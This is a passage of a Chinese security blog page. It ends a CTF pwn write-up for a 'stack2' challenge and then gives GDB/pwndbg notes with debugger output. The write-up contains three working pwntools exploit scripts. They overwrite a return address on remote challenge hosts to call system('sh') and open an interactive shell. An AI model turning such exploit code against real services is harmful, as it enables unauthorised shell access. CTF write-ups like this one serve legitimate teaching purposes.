class="function"><span class="keyword">def</span> <span class="title">write_addr</span><span class="params">(addr,va)</span>:</span></span><br><span class="line">	io.sendline(<span class="string">"3"</span>)</span><br><span class="line">	io.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">	io.sendline(str(addr))</span><br><span class="line">	io.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">	io.sendline(str(va))</span><br><span class="line">	io.recvuntil(<span class="string">"5. exit\n"</span>) </span><br><span class="line">io=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'31725'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"><span class="comment"># write  system_addr</span></span><br><span class="line">write_addr(leave_offset,<span class="number">0XAF</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">1</span>,<span class="number">0X85</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line">io.sendline(<span class="string">"5"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这个题有个坑点在于题目给出了<code>getshell</code>的函数，但是出题人在搭建<strong>docker</strong>环境时未注意，环境中只给了<code>sh</code>，在发现问题后考虑到题目依然可解就未再次更改环境。题目依然是简单的栈溢出，只不过不能直接跳转到<code>getshell</code>，需要简单的<strong>ROP</strong>一下，我们只需要找到<code>system</code>函数的调用地址和<code>bin/sh</code>的字符串地址即可</p>
<p>最终的Exploit为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">system_addr=<span class="number">0x080485AF</span></span><br><span class="line">leave_offset=<span class="number">0x84</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span><span class="params">(addr,va)</span>:</span></span><br><span class="line">	io.sendline(<span class="string">"3"</span>)</span><br><span class="line">	io.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">	io.sendline(str(addr))</span><br><span class="line">	io.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">	io.sendline(str(va))</span><br><span class="line">	io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line">io=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'31725'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"><span class="comment"># write  system_addr  0x08048450</span></span><br><span class="line">write_addr(leave_offset,<span class="number">0X50</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">1</span>,<span class="number">0X84</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line"><span class="comment"># sh_addr  0x08048987</span></span><br><span class="line">leave_offset+=<span class="number">8</span></span><br><span class="line"><span class="keyword">print</span> leave_offset</span><br><span class="line">write_addr(leave_offset,<span class="number">0x87</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">1</span>,<span class="number">0X89</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line">io.sendline(<span class="string">"5"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">g_local=<span class="literal">True</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">	sh = process(<span class="string">'./stack2'</span>)<span class="comment">#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;</span></span><br><span class="line">	gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	sh = remote(<span class="string">"47.96.239.28"</span>, <span class="number">2333</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_byte</span><span class="params">(off, val)</span>:</span></span><br><span class="line">	sh.send(<span class="string">"3\n"</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">	sh.send(str(off) + <span class="string">"\n"</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">	sh.send(str(val) + <span class="string">"\n"</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_dword</span><span class="params">(off, val)</span>:</span></span><br><span class="line">	write_byte(off, val &amp; <span class="number">0xff</span>)</span><br><span class="line">	write_byte(off + <span class="number">1</span>, (val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">	write_byte(off + <span class="number">2</span>, (val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">	write_byte(off + <span class="number">3</span>, (val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">	sh.send(<span class="string">"5\n"</span>)</span><br><span class="line">	sh.interactive()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">sh.send(<span class="string">"1\n"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">sh.send(<span class="string">"1\n"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"></span><br><span class="line">write_dword(<span class="number">0x84</span>, <span class="number">0x8048450</span>)</span><br><span class="line">write_dword(<span class="number">0x8C</span>, <span class="number">0x8048980</span> + <span class="number">7</span>)</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/04/GDB▒╩╝╟/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/09/04/GDB▒╩╝╟/" class="post-title-link" itemprop="url">GDB笔记</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-09-04 07:05:55 / Modified: 22:06:22" itemprop="dateCreated datePublished" datetime="2019-09-04T07:05:55-07:00">2019-09-04</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h2><h3 id="vmmap"><a href="#vmmap" class="headerlink" title="vmmap"></a>vmmap</h3><p>查看程序地址布局</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x55af2b74c000</span>     <span class="number">0x55af2b74d000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /mnt/hgfs/shared/xman/first/pwn/dicegame/dice_game</span><br><span class="line">    <span class="number">0x55af2b94d000</span>     <span class="number">0x55af2b94e000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /mnt/hgfs/shared/xman/first/pwn/dicegame/dice_game</span><br><span class="line">    <span class="number">0x55af2b94e000</span>     <span class="number">0x55af2b94f000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /mnt/hgfs/shared/xman/first/pwn/dicegame/dice_game</span><br><span class="line">    <span class="number">0x55af2bfe7000</span>     <span class="number">0x55af2c008000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7eff0e064000</span>     <span class="number">0x7eff0e224000</span> r-xp   <span class="number">1</span>c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7eff0e224000</span>     <span class="number">0x7eff0e424000</span> ---p   <span class="number">200000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7eff0e424000</span>     <span class="number">0x7eff0e428000</span> r--p     <span class="number">4000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7eff0e428000</span>     <span class="number">0x7eff0e42a000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7eff0e42a000</span>     <span class="number">0x7eff0e42e000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7eff0e42e000</span>     <span class="number">0x7eff0e454000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7eff0e635000</span>     <span class="number">0x7eff0e638000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7eff0e653000</span>     <span class="number">0x7eff0e654000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7eff0e654000</span>     <span class="number">0x7eff0e655000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7eff0e655000</span>     <span class="number">0x7eff0e656000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7fffcce94000</span>     <span class="number">0x7fffcceb5000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line">    <span class="number">0x7fffccef0000</span>     <span class="number">0x7fffccef3000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7fffccef3000</span>     <span class="number">0x7fffccef5000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure>

<h3 id="telescope"><a href="#telescope" class="headerlink" title="telescope"></a>telescope</h3><p>telescope [addr]  [count]</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope </span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffcceb26e8</span> —▸ <span class="number">0x55af2b74cbfc</span> ◂— mov    qword ptr [rbp - <span class="number">0x18</span>], rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rsi  <span class="number">0x7fffcceb26f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffcceb2720</span> —▸ <span class="number">0x55af2b74ccd0</span> ◂— push   r15</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7fffcceb26e8</span> <span class="number">30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffcceb26e8</span> —▸ <span class="number">0x55af2b74cbfc</span> ◂— mov    qword ptr [rbp - <span class="number">0x18</span>], rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rsi  <span class="number">0x7fffcceb26f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffcceb2720</span> —▸ <span class="number">0x55af2b74ccd0</span> ◂— push   r15</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│      <span class="number">0x7fffcceb2728</span> —▸ <span class="number">0x55af2b74c8f0</span> ◂— xor    ebp, ebp</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│      <span class="number">0x7fffcceb2730</span> ◂— <span class="number">0x5d6df5a3</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│      <span class="number">0x7fffcceb2738</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│ rbp  <span class="number">0x7fffcceb2740</span> —▸ <span class="number">0x55af2b74ccd0</span> ◂— push   r15</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│      <span class="number">0x7fffcceb2748</span> —▸ <span class="number">0x7eff0e084830</span> (__libc_start_main+<span class="number">240</span>) ◂— mov    edi, eax</span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│      <span class="number">0x7fffcceb2750</span> ◂— <span class="number">0x1</span></span><br><span class="line">0e:0070│      0x7fffcceb2758 —▸ 0x7fffcceb2828 —▸ 0x7fffcceb4208 ◂— 'dice_game'</span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│      <span class="number">0x7fffcceb2760</span> ◂— <span class="number">0x10e653ca0</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│      <span class="number">0x7fffcceb2768</span> —▸ <span class="number">0x55af2b74cb99</span> ◂— push   rbp</span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│      <span class="number">0x7fffcceb2770</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│      <span class="number">0x7fffcceb2778</span> ◂— <span class="number">0x8904a58936d20a67</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│      <span class="number">0x7fffcceb2780</span> —▸ <span class="number">0x55af2b74c8f0</span> ◂— xor    ebp, ebp</span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│      <span class="number">0x7fffcceb2788</span> —▸ <span class="number">0x7fffcceb2820</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│      <span class="number">0x7fffcceb2790</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│      <span class="number">0x7fffcceb27a0</span> ◂— <span class="number">0xdda56ab6e1d20a67</span></span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│      <span class="number">0x7fffcceb27a8</span> ◂— <span class="number">0xdfa4ef7020a20a67</span></span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│      <span class="number">0x7fffcceb27b0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">1c:00e0│      0x7fffcceb27c8 —▸ 0x7fffcceb2838 —▸ 0x7fffcceb4212 ◂— 0x505f4150515f5451 ('QT_QPA_P')</span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│      <span class="number">0x7fffcceb27d0</span> —▸ <span class="number">0x7eff0e655168</span> —▸ <span class="number">0x55af2b74c000</span> ◂— jg     <span class="number">0x55af2b74c047</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7fffcceb26e8</span> </span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffcceb26e8</span> —▸ <span class="number">0x55af2b74cbfc</span> ◂— mov    qword ptr [rbp - <span class="number">0x18</span>], rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rsi  <span class="number">0x7fffcceb26f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffcceb2720</span> —▸ <span class="number">0x55af2b74ccd0</span> ◂— push   r15</span><br></pre></td></tr></table></figure>

<h3 id="x"><a href="#x" class="headerlink" title="x"></a>x</h3><p>格式：x/&lt;n/f/u&gt;  <addr></addr></p>
<p>n:是正整数，表示需要显示的内存单元的个数，即从当前地址向后显示n个内存单元的内容，一个内存单元的大小由第三个参数u定义。</p>
<p>f:表示addr指向的内存内容的输出格式，s对应输出字符串，此处需特别注意输出整型数据的格式：</p>
<p>x 按十六进制格式显示变量。</p>
<p>d 按十进制格式显示变量。</p>
<p>u 按十六进制格式显示无符号整型。</p>
<p>o 按八进制格式显示变量。</p>
<p>t 按二进制格式显示变量。</p>
<p>a 按十六进制格式显示变量。</p>
<p>c 按字符格式显示变量。</p>
<p>f 按浮点数格式显示变量。</p>
<p>u:就是指以多少个字节作为一个内存单元-unit,默认为4。当然u还可以用被一些字符表示，如b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes</p>
<p>示例:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>wx <span class="number">0x7fffcceb26e8</span></span><br><span class="line"><span class="number">0x7fffcceb26e8</span>:	<span class="number">0x2b74cbfc</span>	<span class="number">0x000055af</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7fffcceb26f8</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7fffcceb2708</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x7fffcceb26e8</span></span><br><span class="line"><span class="number">0x7fffcceb26e8</span>:	<span class="number">0x000055af2b74cbfc</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffcceb26f8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffcceb2708</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffcceb2718</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000055af2b74ccd0</span></span><br><span class="line"><span class="number">0x7fffcceb2728</span>:	<span class="number">0x000055af2b74c8f0</span>	<span class="number">0x000000005d6df5a3</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10b</span>x <span class="number">0x7fffcceb26e8</span></span><br><span class="line"><span class="number">0x7fffcceb26e8</span>:	<span class="number">0xfc</span>	<span class="number">0xcb</span>	<span class="number">0x74</span>	<span class="number">0x2b</span>	<span class="number">0xaf</span>	<span class="number">0x55</span>	<span class="number">0x00</span>	<span class="number">0x00</span></span><br><span class="line"><span class="number">0x7fffcceb26f0</span>:	<span class="number">0x00</span>	<span class="number">0x00</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>hx <span class="number">0x7fffcceb26e8</span></span><br><span class="line"><span class="number">0x7fffcceb26e8</span>:	<span class="number">0xcbfc</span>	<span class="number">0x2b74</span>	<span class="number">0x55af</span>	<span class="number">0x0000</span>	<span class="number">0x0000</span>	<span class="number">0x0000</span>	<span class="number">0x0000</span>	<span class="number">0x0000</span></span><br><span class="line"><span class="number">0x7fffcceb26f8</span>:	<span class="number">0x0000</span>	<span class="number">0x0000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10b</span> <span class="number">0x7fffcceb26e8</span></span><br><span class="line"><span class="number">0x7fffcceb26e8</span>:	<span class="number">0xfc</span>	<span class="number">0xcb</span>	<span class="number">0x74</span>	<span class="number">0x2b</span>	<span class="number">0xaf</span>	<span class="number">0x55</span>	<span class="number">0x00</span>	<span class="number">0x00</span></span><br><span class="line"><span class="number">0x7fffcceb26f0</span>:	<span class="number">0x00</span>	<span class="number">0x00</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>c <span class="number">0x7fffcceb26e8</span></span><br><span class="line">0x7fffcceb26e8:	-4 '\374'	-53 '\313'	116 't'	43 '+'	-81 '\257'	85 'U'	0 '\000'	0 '\000'</span><br><span class="line">0x7fffcceb26f0:	0 '\000'	0 '\000'</span><br></pre></td></tr></table></figure>

<h3 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h3><p>显示堆的情况</p>
<h3 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h3><p>显示堆的分配情况</p>
<h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>stack [count]<br>显示栈的情况</p>
<h2 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h2><h3 id="b"><a href="#b" class="headerlink" title="b"></a>b</h3><p>直接输入b会把断点下在当前rip或者eip的位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">RIP  <span class="number">0x7ffff7b04260</span> (__read_nocancel+<span class="number">7</span>) ◂— cmp    rax, <span class="number">-0xfff</span></span><br><span class="line">───────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────</span><br><span class="line"> ► <span class="number">0x7ffff7b04260</span> &lt;__read_nocancel+<span class="number">7</span>&gt;     cmp    rax, <span class="number">-0xfff</span></span><br><span class="line">   <span class="number">0x7ffff7b04266</span> &lt;__read_nocancel+<span class="number">13</span>&gt;    jae    read+<span class="number">73</span> &lt;<span class="number">0x7ffff7b04299</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x7ffff7b04299</span> &lt;read+<span class="number">73</span>&gt;               mov    rcx, qword ptr [rip + <span class="number">0x2ccbd8</span>]</span><br><span class="line">   <span class="number">0x7ffff7b042a0</span> &lt;read+<span class="number">80</span>&gt;               neg    eax</span><br><span class="line">   <span class="number">0x7ffff7b042a2</span> &lt;read+<span class="number">82</span>&gt;               mov    dword ptr fs:[rcx], eax</span><br><span class="line">   <span class="number">0x7ffff7b042a5</span> &lt;read+<span class="number">85</span>&gt;               <span class="keyword">or</span>     rax, <span class="number">0xffffffffffffffff</span></span><br><span class="line">   <span class="number">0x7ffff7b042a9</span> &lt;read+<span class="number">89</span>&gt;               ret    </span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7ffff7b042aa</span>                         nop    word ptr [rax + rax]</span><br><span class="line">   <span class="number">0x7ffff7b042b0</span> &lt;write&gt;                 cmp    dword ptr [rip + <span class="number">0x2d2489</span>], <span class="number">0</span> &lt;<span class="number">0x7ffff7dd6740</span>&gt;</span><br><span class="line">   <span class="number">0x7ffff7b042b7</span> &lt;write+<span class="number">7</span>&gt;               jne    write+<span class="number">25</span> &lt;<span class="number">0x7ffff7b042c9</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x7ffff7b042c9</span> &lt;write+<span class="number">25</span>&gt;              sub    rsp, <span class="number">8</span></span><br><span class="line">────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdce8</span> —▸ <span class="number">0x555555554bfc</span> ◂— mov    qword ptr [rbp - <span class="number">0x18</span>], rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rsi  <span class="number">0x7fffffffdcf0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdd20</span> —▸ <span class="number">0x555555554cd0</span> ◂— push   r15</span><br><span class="line">──────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">7f</span>fff7b04260 __read_nocancel+<span class="number">7</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">555555554b</span>fc</span><br><span class="line">   f <span class="number">2</span>     <span class="number">7f</span>fff7a2d830 __libc_start_main+<span class="number">240</span></span><br><span class="line">Program received signal SIGINT</span><br><span class="line">pwndbg&gt; b</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x7ffff7b04260</span>: file ../sysdeps/unix/syscall-<span class="keyword">template</span>.S, line <span class="number">84.</span></span><br></pre></td></tr></table></figure>

<p>b  *addr</p>
<p>下断点在addr处</p>
